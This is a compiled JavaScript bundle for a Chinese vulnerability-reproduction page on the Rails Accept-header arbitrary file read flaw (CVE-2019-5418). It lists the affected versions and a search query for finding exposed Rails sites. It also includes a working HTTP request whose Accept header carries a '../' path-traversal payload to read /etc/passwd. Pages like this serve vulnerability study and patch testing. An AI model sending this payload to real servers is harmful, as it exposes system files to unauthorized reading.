(window.webpackJsonp=window.webpackJsonp||[]).push([[631],{1292:function(t,s,a){t.exports=a.p+"assets/img/1656045922866-e3e54d8e-a8a7-45e9-bdef-be60311151cb.a23c2a59.png"},3029:function(t,s,a){"use strict";a.r(s);var r=a(65),e=Object(r.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"rails-accept-任意文件读取漏洞-cve-2019-5418"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#rails-accept-任意文件读取漏洞-cve-2019-5418"}},[t._v("#")]),t._v(" Rails Accept 任意文件读取漏洞 CVE-2019-5418")]),t._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),s("p",[t._v("Ruby on Rails是一个 Web 应用程序框架,是一个相对较新的 Web 应用程序框架，构建在 Ruby 语言之上。这个漏洞主要是由于Ruby on Rails使用了指定参数的render file来渲染应用之外的视图，我们可以通过修改访问某控制器的请求包，通过“…/…/…/…/”来达到路径穿越的目的，然后再通过“{{”来进行模板查询路径的闭合，使得所要访问的文件被当做外部模板来解析。")]),t._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v("Rail <= 5.2.2.1")]),s("br"),t._v(" "),s("h2",{attrs:{id:"网络测绘"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),s("a-checkbox",{attrs:{checked:""}},[t._v('title="Ruby On Rails"')]),s("br"),t._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),s("p",[t._v("主页面")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2022/png/2117730/1656041292346-1069b91e-aa5e-4d53-821a-9150720e9b5e.png",alt:"img"}})]),t._v(" "),s("p",[t._v("验证请求包")]),t._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("GET")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("robots "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("127.0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".0")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v(".1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("3000")]),t._v("\nAccept"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" deflate\nAccept"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("etc"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("passwd"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\nAccept"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Language"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" en\nUser"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Mozilla"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5.0")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("compatible"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("MSIE")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("9.0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Windows "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("NT")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("6.1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Win64"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" x64"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Trident"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5.0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nConnection"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" close\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br")])]),s("p",[s("img",{attrs:{src:a(1292),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);